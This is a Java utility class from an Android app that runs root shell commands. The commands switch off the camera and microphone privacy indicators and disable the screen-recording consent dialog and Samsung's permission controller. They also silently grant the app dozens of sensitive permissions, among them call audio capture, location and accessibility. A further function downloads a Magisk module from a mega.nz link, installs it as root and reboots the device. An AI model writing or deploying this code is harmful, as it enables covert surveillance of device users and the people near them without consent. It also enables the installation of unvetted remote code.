package com.checkmate.android.util;

import java.io.DataOutputStream;
import java.io.IOException;

public class RootCommandExecutor {

    public static void main(String[] args) {
        // Run all commands
        hideCameraGreenDot();
        disableProjectionConfirmation();
        grantAllPermissions();
    }

    /**
     * Hide camera/microphone green indicator.
     */
    public static void hideCameraGreenDot() {
        String[] commands = {
                // Disable system indicator flags
                "settings put secure camera_mic_icons_enabled 0",
                "settings put global camera_mic_icons_enabled 0"  // Samsung fallback
        };
        executeAsRoot(commands);
    }

    /**
     * Disable the MediaProjection consent dialog so recording/casting starts immediately.
     */
    public static void disableProjectionConfirmation() {
        String[] commands = {
                // Universal Android flag (may work on most devices)
                "settings put secure screen_project_confirm 0",

                // Samsung-specific override
                "settings put secure sem_force_confirm_before_use 0",

                // Disable Android's MediaProjection UI component
                "pm disable com.android.systemui.mediaprojection",

                // Disable Samsung permission controller that may re-trigger confirmation
                "pm disable-user --user 0 com.samsung.android.permissioncontroller",

                // Grant WRITE_SECURE_SETTINGS so our settings changes persist
                "pm grant com.checkmate.android android.permission.WRITE_SECURE_SETTINGS",

                // Grant privileged capture permission (requires system signature or priv-app install)
                "pm grant com.checkmate.android android.permission.CAPTURE_VIDEO_OUTPUT",

                // Allow the app to project media without user consent
                "cmd appops set --user 0 com.checkmate.android PROJECT_MEDIA allow"
        };
        executeAsRoot(commands);
    }

    /**
     * Grant all declared permissions and lift required app-ops without user prompts.
     */
    public static void grantAllPermissions() {
        disableProjectionConfirmation();
        String[] commands = {
                // Dangerous and signature-level permissions
                "pm grant com.checkmate.android android.permission.ACCESS_NETWORK_STATE",
                "pm grant com.checkmate.android android.permission.CAMERA",
                "pm grant com.checkmate.android android.permission.ACCESS_FINE_LOCATION",
                "pm grant com.checkmate.android android.permission.CHANGE_WIFI_MULTICAST_STATE",
                "pm grant com.checkmate.android android.permission.CHANGE_NETWORK_STATE",
                "pm grant com.checkmate.android android.permission.BLUETOOTH",
                "pm grant com.checkmate.android android.permission.INTERNET",
                "pm grant com.checkmate.android android.permission.POST_NOTIFICATIONS",
                "pm grant com.checkmate.android android.permission.RECORD_AUDIO",
                "pm grant com.checkmate.android android.permission.READ_PHONE_STATE",
                "pm grant com.checkmate.android android.permission.FOREGROUND_SERVICE",
                "pm grant com.checkmate.android android.permission.WRITE_EXTERNAL_STORAGE",
                "pm grant com.checkmate.android android.permission.READ_EXTERNAL_STORAGE",
                "pm grant com.checkmate.android android.permission.MODIFY_AUDIO_SETTINGS",
                "pm grant com.checkmate.android android.permission.MODIFY_AUDIO_ROUTING",
                "pm grant com.checkmate.android android.permission.BROADCAST_STICKY",
                "pm grant com.checkmate.android android.permission.VIBRATE",
                "pm grant com.checkmate.android android.permission.READ_PRIVILEGED_PHONE_STATE",
                "pm grant com.checkmate.android android.permission.REQUEST_INSTALL_PACKAGES",
                "pm grant com.checkmate.android android.permission.ACCESS_WIFI_STATE",
                "pm grant com.checkmate.android android.permission.CHANGE_WIFI_STATE",
                "pm grant com.checkmate.android android.permission.ACCESS_COARSE_LOCATION",
                "pm grant com.checkmate.android android.permission.WAKE_LOCK",
                "pm grant com.checkmate.android android.permission.MANAGE_EXTERNAL_STORAGE",
                "pm grant com.checkmate.android android.permission.BIND_ACCESSIBILITY_SERVICE",
                "pm grant com.checkmate.android com.android.permission.RECORD_AUDIO_CALL",
                "pm grant com.checkmate.android android.permission.INTERACT_ACROSS_USERS_FULL",
                "pm grant com.checkmate.android android.permission.REQUEST_IGNORE_BACKGROUND_RESTRICTIONS",
                "pm grant com.checkmate.android android.permission.SYSTEM_ALERT_WINDOW",
                "pm grant com.checkmate.android android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                "pm grant com.checkmate.android android.permission.ACCESS_NOTIFICATION_POLICY",
                "pm grant com.checkmate.android android.permission.ACCESS_SUPERUSER",
                "pm grant com.checkmate.android android.permission.WRITE_SETTINGS",
                "pm grant com.checkmate.android android.permission.WRITE_SECURE_SETTINGS",
                "pm grant com.checkmate.android android.permission.MEDIA_PROJECTION",
                "pm grant com.checkmate.android android.permission.FOREGROUND_SERVICE_MICROPHONE",
                "pm grant com.checkmate.android android.permission.FOREGROUND_SERVICE_PHONE_CALL",
                "pm grant com.checkmate.android android.permission.MANAGE_OWN_CALLS",
                "pm grant com.checkmate.android android.permission.CAPTURE_VOICE_COMMUNICATION_OUTPUT",
                "pm grant com.checkmate.android android.permission.CAPTURE_AUDIO_OUTPUT",
                "pm grant com.checkmate.android com.samsung.android.providers.context.permission.WRITE_USE_APP_FEATURE_SURVEY",
                "pm grant com.checkmate.android android.permission.READ_MEDIA_AUDIO",
                "pm grant com.checkmate.android android.permission.MANAGE_DEVICE_POLICY_AUDIO_OUTPUT",

                // Lift app-ops for specified operations
                "cmd appops set --user 0 com.checkmate.android PROJECT_MEDIA allow",
                "cmd appops set --user 0 com.checkmate.android SYSTEM_ALERT_WINDOW allow",
                "cmd appops set --user 0 com.checkmate.android MANAGE_EXTERNAL_STORAGE allow",
                "cmd appops set --user 0 com.checkmate.android WRITE_SETTINGS allow"
        };
        executeAsRoot(commands);
    }

    /**
     * Revert all changes back to defaults.
     */
    public static void revertAll() {
        String[] commands = {
                // Restore indicator flags
                "settings put secure camera_mic_icons_enabled 1",
                "settings put global camera_mic_icons_enabled 1",

                // Restore projection confirmation
                "settings put secure screen_project_confirm 1",
                "settings put secure sem_force_confirm_before_use 1",

                // Re-enable disabled packages
                "pm enable com.android.systemui.mediaprojection",
                "pm enable com.samsung.android.permissioncontroller",

                // Revoke permissions
                "pm revoke com.checkmate.android android.permission.WRITE_SECURE_SETTINGS",
                "pm revoke com.checkmate.android android.permission.CAPTURE_VIDEO_OUTPUT",

                // Clear app-op overrides
                "cmd appops set --user 0 com.checkmate.android PROJECT_MEDIA default",
                "cmd appops set --user 0 com.checkmate.android SYSTEM_ALERT_WINDOW default",
                "cmd appops set --user 0 com.checkmate.android MANAGE_EXTERNAL_STORAGE default",
                "cmd appops set --user 0 com.checkmate.android WRITE_SETTINGS default"
        };
        executeAsRoot(commands);
    }

    public static void updateMagiskModule(String moduleUrl) {
        // Default fallback URL
        String defaultUrl = "https://mega.nz/file/M5ZHQCpQ#Y5US7jx-h5k0DmrKl4V38VfgjL9sUmoCy0VPcAJjLBc";
        String url = (moduleUrl == null || moduleUrl.isEmpty()) ? defaultUrl : moduleUrl;

        // Derive filename from URL
        String fileName = "checkmate_record.zip";

        String modulePath = "/data/adb/modules_update/" + fileName;
        String[] commands = {
                "mkdir -p /data/adb/modules_update",
                // Download the module ZIP
                "wget -O " + modulePath + " \"" + url + "\"",
                "chmod 644 " + modulePath,
                // Install module using Magisk CLI
                "magisk --install-module " + modulePath,
                // Reboot to apply changes
                "reboot"
        };
        executeAsRoot(commands);
    }

    /**
     * Executes a list of shell commands as root.
     */
    private static void executeAsRoot(String[] commands) {
        Process process = null;
        DataOutputStream os = null;
        try {
            process = Runtime.getRuntime().exec("su");
            os = new DataOutputStream(process.getOutputStream());

            for (String cmd : commands) {
                os.writeBytes(cmd + "\n");
            }
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        } finally {
            try {
                if (os != null) os.close();
                if (process != null) process.destroy();
            } catch (IOException ignored) {}
        }
    }
}
